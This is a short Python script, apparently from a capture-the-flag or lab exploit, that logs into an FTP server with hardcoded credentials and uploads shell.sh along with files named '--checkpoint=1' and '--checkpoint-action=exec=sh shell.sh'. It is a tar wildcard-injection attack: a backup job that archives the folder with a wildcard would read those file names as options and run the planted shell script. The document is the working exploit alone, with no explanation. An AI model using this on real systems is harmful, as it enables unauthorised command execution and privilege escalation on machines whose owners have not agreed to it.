import ftplib
session = ftplib.FTP('172.20.0.1','backupmgr','SuperS1ckP4ssw0rd123!')
session.set_pasv(False)
file = open('shell.sh','rb')
session.cwd('files')                          # file to send
session.storbinary('STOR shell.sh', file)     # send the file
file.close()                                  # close file and FTP
file = open('--checkpoint=1','rb')
session.storbinary('STOR ' + '--checkpoint=1', file)     # send the file
file.close()                                             # close file and FTP
file = open('--checkpoint-action=exec=sh shell.sh','rb')
session.storbinary('STOR ' + '--checkpoint-action=exec=sh shell.sh', file)     # send the file
file.close()                                                                   # close file and FTP
session.quit()
